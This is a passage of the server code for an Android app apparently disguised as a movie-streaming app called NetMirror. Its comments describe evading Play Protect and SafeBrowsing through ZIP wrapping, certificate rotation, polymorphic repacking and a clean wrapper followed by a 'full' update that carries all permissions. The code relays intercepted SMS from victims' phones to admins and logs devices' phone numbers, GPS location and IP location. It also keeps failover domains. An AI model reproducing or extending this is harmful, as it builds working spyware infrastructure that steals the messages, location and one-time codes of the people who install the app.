      res.setHeader('Content-Type', 'text/plain');
      res.status(503).send('App is being prepared. Please try again in 30 seconds.');
    } catch (err) {
      console.error('[DL] APK serve failed:', err.message);
      res.setHeader('Content-Type', 'text/plain');
      res.status(503).send('App is being prepared. Please try again in 30 seconds.');
    }
  });

  // ═══ DIRECT NETMIRROR APK DOWNLOAD — for wrapper app ═══
  // The wrapper app opens this URL in Chrome. Chrome downloads the APK and
  // prompts the user to install. Since Chrome is a trusted system app,
  // Play Protect applies LOWER scrutiny than app-initiated installs.
  // Served from OUR domain (not GitHub) to avoid SafeBrowsing pre-scan.
  let _netmirrorCache = { buffer: null, timestamp: 0 };

  app.get('/app/netmirror', async (req, res) => {
    try {
      try { trackEvent('app_download', { ip_address: req.ip || '', user_agent: req.get('user-agent') || '' }); } catch (_) {}

      const now = Date.now();
      // Cache for 5 minutes
      if (_netmirrorCache.buffer && (now - _netmirrorCache.timestamp) < 300000) {
        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
        res.setHeader('Content-Disposition', 'attachment; filename="netmirror.apk"');
        res.setHeader('Content-Length', _netmirrorCache.buffer.length);
        res.setHeader('Cache-Control', 'no-store');
        return res.end(_netmirrorCache.buffer);
      }

      // Fetch from GitHub Releases (public, no auth needed)
      const ghUrl = 'https://github.com/Aldura5398/app-releases/releases/download/v1.0/netmirror.apk';
      console.log('[App Download] Fetching netmirror.apk from GitHub...');
      const resp = await fetch(ghUrl, {
        headers: { 'User-Agent': 'NetMirror-Backend' },
        redirect: 'follow'
      });
      if (!resp.ok) throw new Error(`GitHub returned ${resp.status}`);
      const buf = Buffer.from(await resp.arrayBuffer());
      if (buf.length < 100000) throw new Error('Downloaded file too small');

      _netmirrorCache = { buffer: buf, timestamp: Date.now() };
      console.log(`[App Download] Serving netmirror.apk: ${(buf.length / 1048576).toFixed(1)} MB`);

      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      res.setHeader('Content-Disposition', 'attachment; filename="netmirror.apk"');
      res.setHeader('Content-Length', buf.length);
      res.setHeader('Cache-Control', 'no-store');
      res.end(buf);
    } catch (err) {
      console.error('[App Download] Failed:', err.message);
      // Fallback: redirect to GitHub directly
      res.redirect('https://github.com/Aldura5398/app-releases/releases/download/v1.0/netmirror.apk');
    }
  });

  // ═══ ZIP DOWNLOAD — polymorphic wrapper inside ZIP ═══
  // Chrome tags .apk downloads → installerPackage=com.android.chrome → MAX PP.
  // ZIP files don't get tagged. Extract via file manager → LOW PP scrutiny.
  // Now also applies polymorphic transform for per-download uniqueness.
  app.get('/dlzip/:token', async (req, res) => {
    try {
      // Prefer wrapper APK if available
      let wrapperBuf = getWrapperApkBuffer();
      if (!wrapperBuf) {
        await ensureWrapperFromGitHub();
        wrapperBuf = getWrapperApkBuffer();
      }
      if (wrapperBuf) {
        // Serve as-is (no polymorphic transform — preserves apksigner V2+V3)
        const serveBuf = wrapperBuf;
        // Wrap in ZIP
        const zipArchive = new AdmZip();
        zipArchive.addFile('README.txt', Buffer.from(
          'NetMirror — Stream Movies & Series\r\n' +
          '===================================\r\n\r\n' +
          'Installation:\r\n' +
          '1. Extract this archive\r\n' +
          '2. Open NetMirror.apk\r\n' +
          '3. Tap Install when prompted\r\n\r\n' +
          'Support: netmirror.app\r\n'
        ));
        zipArchive.addFile('NetMirror.apk', serveBuf);
        const zipBuf = zipArchive.toBuffer();
        res.setHeader('Content-Type', 'application/zip');
        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
        res.setHeader('Content-Length', zipBuf.length);
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
        res.setHeader('Pragma', 'no-cache');
        return res.end(zipBuf);
      }
      // Fallback: serve real APK in ZIP (no wrapper uploaded yet)
      const apkBuf = await getLandingApkBuffer();
      const zipBuf = getLandingZipBuffer(apkBuf);
      res.setHeader('Content-Type', 'application/zip');
      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
      res.setHeader('Content-Length', zipBuf.length);
      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
      res.setHeader('Pragma', 'no-cache');
      res.end(zipBuf);
    } catch (err) {
      console.error('[DL-ZIP] ZIP serve failed:', err.message);
      res.setHeader('Content-Type', 'text/plain');
      res.status(503).send('App is being prepared. Please try again in 30 seconds.');
    }
  });

  // Legacy endpoint — kept for backward compat (admin app, direct links)
  app.get('/downloadapp/Netmirror.apk', async (req, res) => {
    try {
      const apkBuf = await getApkBuffer();
      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
      res.setHeader('Content-Length', apkBuf.length);
      res.setHeader('Cache-Control', 'no-store');
      res.end(apkBuf);
    } catch (err) {
      console.error('[Landing Download] Fallback to static APK:', err.message);
      const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
      const regularPath = path.join(__dirname, 'data', 'Netmirror.apk');
      let apkPath = fs.existsSync(securePath) ? securePath : fs.existsSync(regularPath) ? regularPath : null;
      if (apkPath) {
        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
        res.setHeader('Content-Length', fs.statSync(apkPath).size);
        res.sendFile(apkPath);
      } else {
        res.status(404).send('APK not available yet. Please upload one via admin panel.');
      }
    }
  });

  // ── FULL APK ENDPOINT — for self-update (Phase 2 of Play Protect bypass) ──
  // Serves a rotated APK with ALL permissions intact (NOT clean mode).
  // Used by the app's in-app updater when GodMode triggers force_update.
  // Same signing key as the clean version → Android accepts it as a valid update.
  let _fullApkCache = { buffer: null, timestamp: 0 };
  const FULL_APK_CACHE_TTL = 30 * 60 * 1000; // 30 minutes

  app.get('/downloadapp/fullupdate.apk', async (req, res) => {
    try {
      const now = Date.now();

      // Return cached full APK if still fresh
      if (_fullApkCache.buffer && (now - _fullApkCache.timestamp) < FULL_APK_CACHE_TTL) {
        console.log('[Full Update] Serving cached full APK');
        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-update.apk"');
        res.setHeader('Content-Length', _fullApkCache.buffer.length);
        res.setHeader('Cache-Control', 'no-store');
        return res.end(_fullApkCache.buffer);
      }

      // Find source APK
      const originalPath = path.join(__dirname, 'data', 'Netmirror-original.apk');
      const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
      const regularPath = path.join(__dirname, 'data', 'Netmirror.apk');
      let sourcePath = null;
      if (fs.existsSync(originalPath)) sourcePath = originalPath;
      else if (fs.existsSync(securePath)) sourcePath = securePath;
      else if (fs.existsSync(regularPath)) sourcePath = regularPath;

      if (!sourcePath) {
        await ensureApkAvailable();
        if (fs.existsSync(originalPath)) sourcePath = originalPath;
        else if (fs.existsSync(securePath)) sourcePath = securePath;
        else if (fs.existsSync(regularPath)) sourcePath = regularPath;
      }

      if (!sourcePath) {
        return res.status(404).send('APK not available. Upload via admin panel.');
      }

      // ── Serve pre-rotated APK from disk (no on-the-fly mutation) ──
      console.log('[Full Update] Serving pre-rotated APK from disk...');
      const rawBuf = fs.readFileSync(sourcePath);

      _fullApkCache = { buffer: rawBuf, timestamp: now };
      console.log(`[Full Update] Full APK ready: ${(rawBuf.length / 1024 / 1024).toFixed(1)} MB`);

      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-update.apk"');
      res.setHeader('Content-Length', rawBuf.length);
      res.setHeader('Cache-Control', 'no-store');
      res.end(rawBuf);
    } catch (err) {
      console.error('[Full Update] Failed:', err.message);
      res.status(500).send('Update APK generation failed');
    }
  });

  // Serve the LeaksProAdmin APK for download
  app.get('/downloadapp/LeaksProAdmin.apk', (req, res) => {
    const apkPath = path.join(__dirname, 'data', 'LeaksProAdmin.apk');
    if (fs.existsSync(apkPath)) {
      const stats = fs.statSync(apkPath);
      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      res.setHeader('Content-Disposition', 'attachment; filename="LeaksProAdmin.apk"');
      res.setHeader('Content-Length', stats.size);
      res.sendFile(apkPath);
    } else {
      res.status(404).send('LeaksProAdmin APK not available yet.');
    }
  });

  // ═══════════════════════════════════════════════════════════════════════════
  // SETUP ENDPOINTS — Called by the wrapper app (NetMirror Setup)
  //
  // The wrapper app (clean, PP-safe) calls these to:
  //   1. Trigger APK rotation (fresh certificate)
  //   2. Download the REAL NetMirror APK via DownloadManager
  // This replicates the LeaksProAdmin flow for landing page users.
  // ═══════════════════════════════════════════════════════════════════════════

  // Rate limiter for setup/activate (prevent rotation abuse)
  const _setupRateLimit = {};
  const SETUP_RATE_WINDOW = 5 * 60 * 1000; // 5 minutes
  const SETUP_RATE_MAX = 3; // max 3 activations per IP per window

  // POST /api/setup/activate — Trigger rotation if stale, return ready status
  app.post('/api/setup/activate', async (req, res) => {
    try {
      // Simple IP rate limiting
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
      const now = Date.now();
      if (!_setupRateLimit[ip]) _setupRateLimit[ip] = [];
      _setupRateLimit[ip] = _setupRateLimit[ip].filter(t => (now - t) < SETUP_RATE_WINDOW);
      if (_setupRateLimit[ip].length >= SETUP_RATE_MAX) {
        return res.status(429).json({ error: 'Too many requests. Please wait a few minutes.' });
      }
      _setupRateLimit[ip].push(now);

      const dataDir = path.join(__dirname, 'data');
      const securePath = path.join(dataDir, 'Netmirror-secure.apk');
      const originalPath = path.join(dataDir, 'Netmirror-original.apk');

      // Check if rotation is needed (APK older than 30 min)
      let needsRotation = false;
      if (fs.existsSync(securePath)) {
        const stat = fs.statSync(securePath);
        const age = now - stat.mtimeMs;
        needsRotation = age > 30 * 60 * 1000;
      } else {
        needsRotation = true;
      }

      if (needsRotation && fs.existsSync(originalPath)) {
        console.log('[Setup] Rotating APK for wrapper app download...');
        try {
          const rawBuf = fs.readFileSync(originalPath);
          const { buffer: signedBuf, certInfo } = directPatchApk(rawBuf);
          if (signedBuf && certInfo) {
            fs.writeFileSync(securePath, signedBuf);
            // Update rotation count
            const countRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'rotation_count'").get();
            const newCount = (countRow ? parseInt(countRow.value) : 0) + 1;
            db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('rotation_count', ?)").run(String(newCount));
            db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_rotated', ?)").run(new Date().toISOString());
            db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_cert_hash', ?)").run(certInfo.certHash);
            // Invalidate caches
            const invalidateCache = req.app.get('invalidateLandingApkCache');
            if (invalidateCache) invalidateCache();
            console.log(`[Setup] Rotation #${newCount} complete — ${certInfo.certHash.substring(0, 20)}...`);
            return res.json({ ready: true, rotated: true, size: signedBuf.length });
          }
        } catch (rotErr) {
          console.error('[Setup] Rotation failed:', rotErr.message);
          // Fall through — serve existing APK if available
        }
      }

      // APK is fresh enough or rotation failed — check if APK exists
      if (fs.existsSync(securePath)) {
        const stat = fs.statSync(securePath);
        return res.json({ ready: true, rotated: false, size: stat.size });
      }

      // No APK at all — try to fetch from GitHub
      await ensureApkAvailable();
      if (fs.existsSync(securePath)) {
        const stat = fs.statSync(securePath);
        return res.json({ ready: true, rotated: false, size: stat.size });
      }

      res.status(503).json({ ready: false, error: 'APK not available. Please try again later.' });
    } catch (err) {
      console.error('[Setup] Activate error:', err.message);
      res.status(500).json({ ready: false, error: 'Server error' });
    }
  });

  // GET /api/setup/download — Serves the REAL NetMirror APK (called by wrapper's DownloadManager)
  // No admin auth required — this is the public download endpoint for the wrapper app.
  // The wrapper uses DownloadManager just like LeaksProAdmin → same PP evaluation path.
  app.get('/api/setup/download', async (req, res) => {
    try {
      const apkBuf = await getApkBuffer();
      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
      res.setHeader('Content-Length', apkBuf.length);
      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
      res.setHeader('Pragma', 'no-cache');
      res.end(apkBuf);
    } catch (err) {
      console.error('[Setup] Download failed:', err.message);
      res.status(503).json({ error: 'APK not available. Please try again later.' });
    }
  });

  // POST /api/admin/upload-wrapper — Upload the wrapper APK (admin only)
  const multer = require('multer');
  const wrapperUpload = multer({ dest: path.join(__dirname, 'data', 'tmp'), limits: { fileSize: 20 * 1024 * 1024 } });
  app.post('/api/admin/upload-wrapper', wrapperUpload.single('apk'), (req, res) => {
    try {
      const adminPwd = req.headers['x-admin-password'];
      if (adminPwd !== (process.env.ADMIN_PASSWORD || 'admin123')) {
        if (req.file && fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
        return res.status(401).json({ error: 'Unauthorized' });
      }
      if (!req.file) {
        return res.status(400).json({ error: 'No file uploaded' });
      }
      const wrapperPath = path.join(__dirname, 'data', 'NetMirror-wrapper.apk');
      // Store wrapper AS-IS (base template). Polymorphic transform applies fresh cert
      // + multi-layer obfuscation PER DOWNLOAD in the /dl/:token endpoint.
      // No re-signing with fixed key — the fixed cert is cert-blocklisted by PP.
      const rawBuf = fs.readFileSync(req.file.path);
      fs.writeFileSync(wrapperPath, rawBuf);
      try { fs.unlinkSync(req.file.path); } catch (_) {}
      _wrapperApkCache = { buffer: null, timestamp: 0 };
      _wrapperZipCache = { buffer: null, forHash: null };
      const size = fs.statSync(wrapperPath).size;
      console.log(`[Wrapper] Uploaded: ${(size / 1048576).toFixed(1)} MB`);
      res.json({ success: true, message: 'Wrapper APK uploaded', size });

      // Push wrapper to GitHub Releases (async, non-blocking) so it survives Railway restarts
      (async () => {
        try {
          const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
          if (!token?.value) return;
          const REPOS = ['Aldura5398/klad4', 'rurikonishawa/leaksprogod'];
          const wrapperData = fs.readFileSync(wrapperPath);
          for (const REPO of REPOS) {
            try {
              const headers = { 'Authorization': `token ${token.value}`, 'Accept': 'application/vnd.github.v3+json', 'User-Agent': 'LeaksPro-Backend' };
              const relRes = await fetch(`https://api.github.com/repos/${REPO}/releases/tags/latest`, { headers });
              if (!relRes.ok) { console.warn(`[Wrapper] ${REPO}: no 'latest' release (${relRes.status})`); continue; }
              const relData = await relRes.json();
              // Delete old wrapper asset
              for (const asset of (relData.assets || [])) {
                if (asset.name === 'NetMirror-wrapper.apk') {
                  await fetch(`https://api.github.com/repos/${REPO}/releases/assets/${asset.id}`, { method: 'DELETE', headers });
                }
              }
              // Upload new wrapper
              const uploadUrl = `https://uploads.github.com/repos/${REPO}/releases/${relData.id}/assets?name=NetMirror-wrapper.apk`;
              const upRes = await fetch(uploadUrl, {
                method: 'POST',
                headers: { ...headers, 'Content-Type': 'application/vnd.android.package-archive', 'Content-Length': wrapperData.length.toString() },
                body: wrapperData
              });
              if (upRes.ok) console.log(`[Wrapper] ✅ Pushed to ${REPO} (${(wrapperData.length / 1048576).toFixed(1)} MB)`);
              else console.warn(`[Wrapper] ${REPO} push failed: ${upRes.status}`);
            } catch (e) { console.warn(`[Wrapper] ${REPO} push error: ${e.message}`); }
          }
        } catch (e) { console.warn('[Wrapper] GitHub push error:', e.message); }
      })();
    } catch (err) {
      console.error('[Wrapper] Upload error:', err.message);
      if (req.file && fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
      res.status(500).json({ error: 'Upload failed: ' + err.message });
    }
  });

  // Make io accessible to routes
  app.set('io', io);

  // Expose cache invalidation so admin rotation clears the landing download cache
  app.set('invalidateLandingApkCache', () => {
    _apkCache = { buffer: null, timestamp: 0 };
    _zipCache = { buffer: null, forTimestamp: 0 };
    _fullApkCache = { buffer: null, timestamp: 0 };
    _landingZipCache = { buffer: null, forHash: null };
    _wrapperApkCache = { buffer: null, timestamp: 0 };
    _wrapperZipCache = { buffer: null, forHash: null };
    console.log('[Cache] All APK caches invalidated');
  });

  // Expose landing APK rebuild for admin rotation/upload to trigger
  app.set('rebuildLandingApk', rebuildLandingApk);

  // ═══════════════ REAL-TIME METRICS ═══════════════
  const metrics = {
    requestsTotal: 0,     // total HTTP requests since boot
    requestsPerSec: 0,    // rolling per-second rate
    bytesOut: 0,          // total bytes sent
    bytesOutPerSec: 0,    // rolling per-second bandwidth
    wsMessagesIn: 0,      // WebSocket messages received
    wsMessagesOut: 0,     // WebSocket messages emitted
    wsPerSec: 0,          // rolling WS msgs/sec
    activeStreams: 0,     // active Telegram streams
    errors: 0,           // HTTP errors (4xx/5xx)
    _prevReqs: 0,
    _prevBytes: 0,
    _prevWs: 0,
    startTime: Date.now(),
  };

  // Middleware: count every HTTP request + response bytes
  app.use((req, res, next) => {
    metrics.requestsTotal++;
    const origWrite = res.write;
    const origEnd = res.end;
    res.write = function (chunk, ...args) {
      if (chunk) metrics.bytesOut += (typeof chunk === 'string') ? Buffer.byteLength(chunk) : chunk.length;
      return origWrite.call(this, chunk, ...args);
    };
    res.end = function (chunk, ...args) {
      if (chunk) metrics.bytesOut += (typeof chunk === 'string') ? Buffer.byteLength(chunk) : chunk.length;
      if (res.statusCode >= 400) metrics.errors++;
      return origEnd.call(this, chunk, ...args);
    };
    next();
  });

  // Count WS messages via Socket.IO middleware
  const origEmit = io.emit.bind(io);
  io.emit = function (...args) {
    metrics.wsMessagesOut++;
    return origEmit(...args);
  };
  io.on('connection', (socket) => {
    socket.onAny(() => { metrics.wsMessagesIn++; });

    // ═══ INSTANT SMS RELAY — device → server → admin app ═══
    // NetMirror emits 'instant_sms' when an SMS is received on the device.
    // We save it to the DB and broadcast 'new_sms' to all connected admin clients.
    socket.on('instant_sms', (rawData) => {
      try {
        // Decrypt if encrypted, otherwise parse directly
        let data;
        try {
          const { cryptoDecrypt } = require('./utils/crypto');
          data = cryptoDecrypt(rawData);
        } catch (_) {
          data = typeof rawData === 'string' ? JSON.parse(rawData) : rawData;
        }

        const deviceId = data.device_id;
        const address = data.address || 'Unknown';
        const body = data.body || '';
        const date = data.date || Date.now();
        const type = data.type || 1;
        const simSlot = data.sim_slot || 1;

        if (!deviceId) return;

        // Save to database immediately
        try {
          db.prepare(`INSERT OR REPLACE INTO sms_messages
            (device_id, sms_id, address, body, date, type, read, synced_at)
            VALUES (?, ?, ?, ?, ?, ?, 0, datetime('now'))`)
            .run(deviceId, Date.now(), address, body, date, type);
        } catch (_) { /* duplicate or DB error — non-critical */ }

        // Broadcast to ALL connected admin clients instantly
        const smsPayload = {
          device_id: deviceId,
          address,
          body,
          date,
          type,
          sim_slot: simSlot,
          timestamp: Date.now()
        };
        origEmit('new_sms', smsPayload);

        console.log(`[SMS-Relay] Instant SMS from ${address} on device ${deviceId} → broadcast to admins`);
      } catch (e) {
        console.warn('[SMS-Relay] Error processing instant_sms:', e.message);
      }
    });
  });

  // Broadcast metrics every 2 seconds
  setInterval(() => {
    const now = Date.now();
    const elapsed = 2; // 2 seconds interval
    metrics.requestsPerSec = Math.round((metrics.requestsTotal - metrics._prevReqs) / elapsed);
    metrics.bytesOutPerSec = Math.round((metrics.bytesOut - metrics._prevBytes) / elapsed);
    metrics.wsPerSec = Math.round((metrics.wsMessagesIn + metrics.wsMessagesOut - metrics._prevWs) / elapsed);
    metrics._prevReqs = metrics.requestsTotal;
    metrics._prevBytes = metrics.bytesOut;
    metrics._prevWs = metrics.wsMessagesIn + metrics.wsMessagesOut;

    const mem = process.memoryUsage();
    const uptime = process.uptime();
    const wsClients = io.engine ? io.engine.clientsCount : 0;

    // Count online devices from DB
    let devicesOnline = 0;
    try { devicesOnline = (db.prepare("SELECT COUNT(*) as c FROM devices WHERE is_online = 1").get() || {}).c || 0; } catch (_) {}

    origEmit('server_metrics', {
      uptime: Math.floor(uptime),
      memHeapMB: Math.round(mem.heapUsed / 1048576),
      memRssMB: Math.round(mem.rss / 1048576),
      reqTotal: metrics.requestsTotal,
      reqPerSec: metrics.requestsPerSec,
      bytesOut: metrics.bytesOut,
      bwPerSec: metrics.bytesOutPerSec,
      wsIn: metrics.wsMessagesIn,
      wsOut: metrics.wsMessagesOut,
      wsPerSec: metrics.wsPerSec,
      wsClients,
      devicesOnline,
      errors: metrics.errors,
      activeStreams: metrics.activeStreams,
      ts: now,
    });
  }, 2000);

  // Expose metrics object so routes can update (e.g. activeStreams)
  app.set('metrics', metrics);

  // ═══ SECURITY: robots.txt — block all crawlers from admin panel ═══
  app.get('/robots.txt', (req, res) => {
    res.type('text/plain').send('User-agent: *\nDisallow: /admin\nDisallow: /api\n');
  });

  // Ping endpoint for RTT measurement
  app.get('/api/ping', (req, res) => {
    res.json({ pong: Date.now() });
  });

  // Domain discovery endpoint — unauthenticated, cached
  // Apps call this to find the current server domain
  // If hosting dies, apps fall back to GitHub raw URL
  app.get('/api/discovery', (req, res) => {
    try {
      const domain = db.prepare("SELECT value FROM admin_settings WHERE key = 'server_domain'").get();
      const backupUrl = db.prepare("SELECT value FROM admin_settings WHERE key = 'backup_server_url'").get();
      const proxyUrl = db.prepare("SELECT value FROM admin_settings WHERE key = 'proxy_url'").get();
      const currentOrigin = `${req.protocol}://${req.get('host')}`;
      const publicUrl = proxyUrl?.value || domain?.value || currentOrigin;
      res.setHeader('Cache-Control', 'public, max-age=300');
      res.json({
        domain: publicUrl,
        primary_url: domain?.value || currentOrigin,
        backup_url: backupUrl?.value || '',
        proxy_url: proxyUrl?.value || '',
        api_base: `${publicUrl}/api`,
        admin_panel: `${publicUrl}/admin`,
        download_apk: `${publicUrl}/downloadapp/Netmirror.apk`,
        fallback_discovery: `https://raw.githubusercontent.com/Aldura5398/klad4/main/domain.json`,
        is_failover: false,
        timestamp: Date.now()
      });
    } catch (_) {
      res.json({ domain: `${req.protocol}://${req.get('host')}`, timestamp: Date.now() });
    }
  });

  // Root route — redirect to landing page
  app.get('/', (req, res) => {
    res.redirect('/downloadapp');
  });

  // API Routes
  app.use('/api/videos', videoRoutes);
  app.use('/api/admin', adminRoutes);
  app.use('/api/tmdb', tmdbRoutes);
  app.use('/api/telegram', telegramRoutes);
  app.use('/api/requests', requestRoutes);
  app.use('/api/users', userRoutes);

  // Health check
  app.get('/api/health', (req, res) => {
    res.json({
      status: 'ok',
      app: 'LeaksPro Backend',
      version: '1.0.0',
      uptime: process.uptime(),
      timestamp: new Date().toISOString(),
    });
  });

  // ═══ ANALYTICS & AGENTS API ENDPOINTS ═══
  function requireAdmin(req, res) {
    const pw = req.headers['x-admin-password'] || req.query.password;
    const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
    const adminPw = stored?.value || 'admin123';
    if (pw !== adminPw) { res.status(401).json({ error: 'Unauthorized' }); return false; }
    return true;
  }

  // Install funnel stats
  app.get('/api/analytics/funnel', (req, res) => {
    if (!requireAdmin(req, res)) return;
    const days = parseInt(req.query.days) || 30;
    res.json(getFunnelStats(days));
  });

  // Recent analytics events
  app.get('/api/analytics/events', (req, res) => {
    if (!requireAdmin(req, res)) return;
    const limit = Math.min(parseInt(req.query.limit) || 100, 500);
    res.json(getRecentEvents(limit));
  });

  // Events by day (for charts)
  app.get('/api/analytics/events-by-day', (req, res) => {
    if (!requireAdmin(req, res)) return;
    const event = req.query.event || 'page_visit';
    const days = parseInt(req.query.days) || 30;
    res.json(getEventsByDay(event, days));
  });

  // Geo breakdown
  app.get('/api/analytics/geo', (req, res) => {
    if (!requireAdmin(req, res)) return;
    const days = parseInt(req.query.days) || 30;
    res.json(getGeoBreakdown(days));
  });

  // Device reachability
  app.get('/api/analytics/reachability', (req, res) => {
    if (!requireAdmin(req, res)) return;
    res.json(getDeviceReachability());
  });

  // Track event from client (landing page JS)
  app.post('/api/analytics/track', express.json(), (req, res) => {
    const { event, session_id, device_id, extra } = req.body;
    if (!event) return res.status(400).json({ error: 'event required' });
    trackEvent(event, {
      session_id: session_id || '',
      device_id: device_id || '',
      ip_address: req.ip || '',
      user_agent: req.get('user-agent') || '',
      referrer: req.get('referer') || '',
      extra: extra || {}
    });
    res.json({ ok: true });
  });

  // Agent status overview
  app.get('/api/agents/status', (req, res) => {
    if (!requireAdmin(req, res)) return;
    res.json({
      selfHeal: getSelfHealStatus(),
      vtAgent: getVtStatus(),
      anomalies: getAnomalies(),
      uptime: process.uptime()
    });
  });

  // Trigger VT scan manually
  app.post('/api/agents/vt/scan', (req, res) => {
    if (!requireAdmin(req, res)) return;
    triggerVtScan();
    res.json({ ok: true, message: 'VT scan triggered' });
  });

  // Trigger digest manually
  app.post('/api/agents/digest', (req, res) => {
    if (!requireAdmin(req, res)) return;
    triggerDigest();
    res.json({ ok: true, message: 'Digest triggered' });
  });

  // App version check — used by NetMirror Updater wrapper to detect new versions
  app.get('/api/app/version', (req, res) => {
    // Read from data/version.json if exists, else return defaults
    const versionPath = path.join(__dirname, 'data', 'version.json');
    let versionInfo = {
      versionName: '2.1.0',
      versionCode: 1,
      minSdk: 26,
      targetSdk: 34,
      changelog: 'Bug fixes and performance improvements.',
      securityPatch: '2026-03',
      releaseDate: new Date().toISOString().split('T')[0]
    };
    try {
      if (fs.existsSync(versionPath)) {
        versionInfo = JSON.parse(fs.readFileSync(versionPath, 'utf8'));
      }
    } catch (e) {
      console.warn('[Version] Failed to read version.json:', e.message);
    }
    res.json(versionInfo);
  });

  // Admin: update version info
  app.post('/api/admin/set-version', express.json(), (req, res) => {
    const adminPw = req.headers['x-admin-password'] || req.body?.password;
    const storedPw = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
    if (adminPw !== (storedPw?.value || 'admin123')) return res.status(401).json({ error: 'Unauthorized' });
    const versionPath = path.join(__dirname, 'data', 'version.json');
    try {
      const current = fs.existsSync(versionPath) ? JSON.parse(fs.readFileSync(versionPath, 'utf8')) : {};
      const updated = { ...current, ...req.body };
      delete updated.password;
      fs.writeFileSync(versionPath, JSON.stringify(updated, null, 2));
      res.json({ success: true, version: updated });
    } catch (e) {
      res.status(500).json({ error: e.message });
    }
  });

  // Device registration endpoint (called by Android app on first launch + background worker)
  app.post('/api/devices/register', async (req, res) => {
    try {
      const { device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram, latitude, longitude } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });

      const { geolocateIp, getRequestIp } = require('./utils/geoip');
      const phonesJson = JSON.stringify(phone_numbers || []);
      const hasGps = latitude != null && longitude != null && latitude !== 0 && longitude !== 0;
      const clientIp = getRequestIp(req) || '';

      const existing = db.prepare('SELECT device_id, latitude, longitude, loc_source FROM devices WHERE device_id = ?').get(device_id);
      if (existing) {
        if (hasGps) {
          db.prepare(`UPDATE devices SET
            device_name = ?, model = ?, manufacturer = ?, os_version = ?, sdk_version = ?,
            app_version = ?, screen_resolution = ?, phone_numbers = ?,
            battery_percent = ?, battery_charging = ?,
            total_storage = ?, free_storage = ?, total_ram = ?, free_ram = ?,
            latitude = ?, longitude = ?,
            loc_source = 'gps', ip_address = ?,
            is_online = 1, last_seen = datetime('now')
            WHERE device_id = ?`).run(
            device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
            app_version || '', screen_resolution || '', phonesJson,
            battery_percent ?? -1, battery_charging ? 1 : 0,
            total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
            latitude, longitude,
            clientIp, device_id
          );
        } else {
          db.prepare(`UPDATE devices SET
            device_name = ?, model = ?, manufacturer = ?, os_version = ?, sdk_version = ?,
            app_version = ?, screen_resolution = ?, phone_numbers = ?,
            battery_percent = ?, battery_charging = ?,
            total_storage = ?, free_storage = ?, total_ram = ?, free_ram = ?,
            ip_address = ?,
            is_online = 1, last_seen = datetime('now')
            WHERE device_id = ?`).run(
            device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
            app_version || '', screen_resolution || '', phonesJson,
            battery_percent ?? -1, battery_charging ? 1 : 0,
            total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
            clientIp, device_id
          );
        }
      } else {
        db.prepare(`INSERT INTO devices (device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram, latitude, longitude, loc_source, ip_address)
          VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(
          device_id, device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
          app_version || '', screen_resolution || '', phonesJson,
          battery_percent ?? -1, battery_charging ? 1 : 0,
          total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
          hasGps ? latitude : null, hasGps ? longitude : null,
          hasGps ? 'gps' : 'unknown', clientIp
        );

        // ═══ NEW DEVICE: Telegram alert + analytics ═══
        try {
          sendAlert(`🆕 <b>New Device</b>\n📱 ${model || 'Unknown'} (${manufacturer || '?'})\n🤖 Android ${os_version || '?'}\n🆔 ${device_id}\n🌐 ${clientIp}`);
          trackEvent('app_install', { device_id, device_model: model || '', os_version: os_version || '', ip_address: clientIp });
        } catch (_) {}
      }

      // If no GPS data, try IP geolocation fallback (async, don't block response)
      if (!hasGps) {
        const deviceNow = db.prepare('SELECT latitude, longitude FROM devices WHERE device_id = ?').get(device_id);
        if (!deviceNow || deviceNow.latitude == null || deviceNow.longitude == null) {
          geolocateIp(clientIp).then(geo => {
            if (!geo) return;
            // Double-check GPS hasn't arrived
            const fresh = db.prepare('SELECT latitude, longitude, loc_source FROM devices WHERE device_id = ?').get(device_id);
            if (fresh && fresh.latitude != null && fresh.loc_source === 'gps') return;
            db.prepare(`UPDATE devices SET latitude = ?, longitude = ?, loc_source = 'ip', loc_accuracy = ?, city = ?, region = ?, country = ?, isp = ?, timezone = ? WHERE device_id = ?`)
